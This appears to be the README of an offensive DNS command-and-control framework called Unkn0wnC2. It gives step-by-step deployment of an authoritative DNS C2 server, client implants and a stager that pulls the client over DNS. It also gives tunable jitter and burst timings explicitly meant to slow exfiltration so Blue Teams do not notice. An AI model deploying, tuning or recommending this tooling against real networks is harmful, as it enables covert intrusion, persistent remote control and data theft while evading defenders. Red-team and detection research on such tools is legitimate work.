# 🕵️ Unkn0wnC2

DNS-based Command & Control framework operating as an authoritative DNS server with encrypted C2 communications.


This DNS C2 implementation's strengths comes from it's malleable C2 timing. 

Many C2s can utilize DNS for covert communications, but the exfil/task timings aren't usually adjustable without changing code directly. This C2 allows you to change the timing of exfil during the build process. Keeping your exfil slow is key to staying stealthy as common C2s send outputs/exfil quickly, alerting Blue Teams on large ammounts of DNS traffic in a short period of time.

## 🚀 Quick Deployment

### 1. 🌐 Domain Setup
Configure NS records at registrar:
```
ns1.yourdomain.net  →  YOUR_SERVER_IP
ns2.yourdomain.net  →  YOUR_SERVER_IP
```
Add glue records at registrar, verify: `dig @8.8.8.8 NS yourdomain.net`

### 2. 🔨 Build
```bash
# Generate unique encryption key
openssl rand -base64 32

# Edit build_config.json - set encryption_key, domain, server IPs
vim build_config.json

# Build all components with production configuration
bash build.sh
```

Output will be in `build/`

### 3. 🖥️ Deploy Server
```bash
# Copy to target server
scp build/dns-server-linux user@server:/opt/unkn0wnc2/
cd /opt/unkn0wnc2

# Run (requires root for port 53, config embedded at build time)
sudo ./dns-server-linux
```

### 4. 📡 Deploy Client
**Option A - Direct:** `./dns-client-linux`  
**Option B - Stager:** `./stager-linux-x64` (downloads client via DNS)

**Production:** Change encryption key, disable debug mode, use system DNS (stealth)

### Malleable Timing (stager / client / exfil)

This project exposes several timing parameters that are intentionally malleable to tune stealth vs throughput. Defaults are set in build_config.json and in the Stager build defaults.

Key parameters and defaults (units):

- Stager
  - jitter_min_ms = 1000 (1.0 s)
  - jitter_max_ms = 2000 (2.0 s)
  - chunks_per_burst = 5
  - burst_pause_ms = 12000 (12 s)
  - retry_delay_seconds = 3
  - max_retries = 5

- Client check-in
  - sleep_min = 60 (60 s)
  - sleep_max = 120 (120 s)

- Client exfil
  - exfil_jitter_min_ms = 10000 (10 s)
  - exfil_jitter_max_ms = 30000 (30 s)
  - exfil_chunks_per_burst = 5
  - exfil_burst_pause_ms = 120000 (120 s)

How the pieces interact (approximate calculations):
- Number of bursts for N chunks: bursts = ceil(N / chunks_per_burst)
- Average jitter (ms) = (jitter_min_ms + jitter_max_ms) / 2
- Stager total time ≈ N * RTT_seconds_per_chunk + bursts * ((avg_jitter_ms + burst_pause_ms) / 1000)
  - Example (stager defaults, 100 chunks): avg_jitter = 1.5 s, burst pause = 12 s → per-burst pause ≈ 13.5 s
    - bursts = 20 → pause_time ≈ 270 s
    - transfer_time ≈ 100 s → total ≈ 370 s (~6 min 10 s)

- Exfil (client) will be significantly slower with larger jitter/pause values:
  - Example (exfil defaults, 100 chunks): avg_jitter = 20 s, burst pause = 120 s → per-burst pause ≈ 140 s
    - bursts = 20 → pause_time ≈ 2800 s (~46 min 40 s)
    - transfer_time ≈ 100 s → total ≈ 2900 s (~48 min 20 s)
